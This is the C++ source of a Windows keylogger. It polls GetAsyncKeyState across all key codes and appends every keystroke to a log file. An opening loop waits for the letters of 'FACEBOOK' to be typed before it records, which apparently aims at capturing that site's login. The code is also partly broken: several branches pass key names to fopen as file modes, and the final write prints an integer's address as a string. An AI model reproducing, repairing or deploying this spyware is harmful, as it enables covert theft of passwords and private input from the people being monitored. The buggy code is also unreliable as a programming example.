#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>

using namespace std;


 int Save(int key, char*file);

int main()
{
  int j = 0;
  char i;
  bool ex = true;
  int exp[]={70,65,67,69,66,79,79,75};


    for (i=8; j<8; i++){
    if (GetAsyncKeyState(i)== -32767 & exp[j]==i ){
        Save(i, "log.txt");
        j++;}  }


while(true){
    for (i=8; i<=255; i++){
        if (GetAsyncKeyState(i)== -32767){
            Save(i, "log.txt");  }
    }}

    return 0;}



    int Save(int key, char*file){
     cout<< key <<endl;
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
     if (key==VK_SHIFT){
      fprintf(OUTPUT_FILE, "%s", " SHIFT "); }
      else if (key==VK_BACK){
        fprintf(OUTPUT_FILE, "%s", " BACK "); }
      else if (key==VK_LBUTTON){
        fprintf(OUTPUT_FILE, "%s", " LBUTTON ");}
        else if(key==VK_RBUTTON){
            fprintf(OUTPUT_FILE, "%s", " RBUTTON ");}
            else if (key==VK_RETURN){
                fprintf(OUTPUT_FILE, "%s", " RETURN ");}
                else if(key==VK_ESCAPE){
                    fprintf(OUTPUT_FILE, "%s", " ESCAPE ");}
                    else if (key==VK_CONTROL){
                        OUTPUT_FILE = fopen(file, " CONTROL ");}
                        else if (key==VK_MENU){
                            OUTPUT_FILE = fopen(file, " ALT ");}
                            else if (key==VK_TAB){
                                OUTPUT_FILE = fopen(file, " TAB ");}
                                else if (key==VK_SPACE){
                                    OUTPUT_FILE = fopen(file, " SPACE ");}
                                    else if (key==VK_CAPITAL){
                                        OUTPUT_FILE = fopen(file, " CAPS LOCK ");}
                                        else if(key==VK_HOME){
                                                OUTPUT_FILE = fopen(file, " HOME ");}
                                                else if (key==VK_END){
                                                    OUTPUT_FILE = fopen(file, " END ");}
                                                  else if (key==VK_PRIOR){
                                                    OUTPUT_FILE = fopen(file, " PG UP ");}
                                                    else if (key==VK_NEXT){
                                                        OUTPUT_FILE = fopen(file, " PG DN");}


     fprintf(OUTPUT_FILE, "%s", &key);
     fclose(OUTPUT_FILE);

    return 0;}



